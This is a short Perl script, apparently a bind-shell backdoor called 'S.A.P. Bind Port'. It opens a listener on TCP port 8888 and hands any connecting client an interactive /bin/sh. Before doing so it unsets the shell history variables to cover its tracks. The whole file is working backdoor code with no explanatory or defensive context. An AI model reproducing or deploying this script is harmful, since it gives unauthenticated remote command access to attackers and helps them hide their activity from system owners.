#!/usr/bin/perl
$SIG{'CHLD'}='IGNORE';
use IO::Socket;
use FileHandle;
$o=" [OK]";
$e="      Error: ";
$l="\r\n-----------------------------------------\r\n";
$h="----   Hello from S.A.P. Bind Port   ----";
print $h;
print "\r\n> Start...";
print "\r\n> Get protocol by name...";
$tcp=getprotobyname("tcp") or die print "$l$e$!$l";
print "           $o";
print "\r\n> Packed address info...";
$sckt=sockaddr_in(8888, INADDR_ANY) or die print "$l$e$!$l";
print "            $o";
print "\r\n> Create socket...";
socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print "$l$e$!$l";
print "                  $o";
print "\r\n> Set socket options...";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1) or die print "$l$e$!$l";
print "             $o";
print "\r\n> Bind socket...";
bind(SOCKET,$sckt) or die print "$l$e$!$l";
print "                    $o";
print "\r\n> Listen socket...";
listen(SOCKET, 5) or die print "$l$e$!$l";
print "                  $o";
print "\r\n> Accept connection...";
accept(CONN,SOCKET) or die print "$l$e$!$l";
print "$l      OK! I'm accept connection.$l";
if(!($pid=fork)) {
	if (!defined $pid){exit(0);}
	open(STDIN, "<&CONN");
	open(STDOUT, ">&CONN");
	open(STDERR, ">&CONN");
	system("unset HISTFILE; unset SAVEHIST;");
	print "\r\n$h\r\n\r\n";
	system('/bin/sh -i');
	print "$l\r\n"; close CONN;
}
